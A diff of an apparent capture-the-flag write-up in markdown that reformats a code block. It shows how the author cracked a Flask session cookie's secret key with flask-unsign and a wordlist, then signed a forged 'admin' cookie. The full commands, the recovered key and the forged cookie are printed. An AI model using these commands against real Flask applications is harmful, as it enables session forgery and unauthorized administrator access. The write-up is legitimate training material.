@@ -84,7 +84,9 @@ For this chal, all we had to do was inpect the website -> Go to Applications -> 
 I gotta admit that I underestimated this one. After doing thorough research on the internet and searching for tools by _dorking_ my ol' friend google, I found smth interesting which just may help me get the flag.  
 _https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask_.   
 So I created a wordlist from the given harcoded set of cookies and ran the command  
-```C:\Users\sunik>flask-unsign --wordlist C:\Users\sunik\OneDrive\Documents\Pictures\flagdedo.txt --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZyTElw.H4uWq9gByrUrgshaHuqtamd6Gog" --no-literal-eval --threads 16```  
+```
+C:\Users\sunik>flask-unsign --wordlist C:\Users\sunik\OneDrive\Documents\Pictures\flagdedo.txt --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZyTElw.H4uWq9gByrUrgshaHuqtamd6Gog" --no-literal-eval --threads 16
+```  
 which gave me the secret key as `b'fortune'`.  
 ![Screenshot 2024-11-01 181531](https://github.com/user-attachments/assets/1be8c1c0-960e-488b-b818-8389b94db8ea)  
 After this, I used another command to generate a new cookie which contains the necessary request i.e `{"very_auth":"admin}` using `C:\Users\sunik>flask-unsign --sign --cookie {'very_auth':'admin'} --secret 'fortune'` which gave me the new cookie as `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZyTOmQ.KBIkUcdk2bRKSjPzJ1H3_aRCwJM`.  
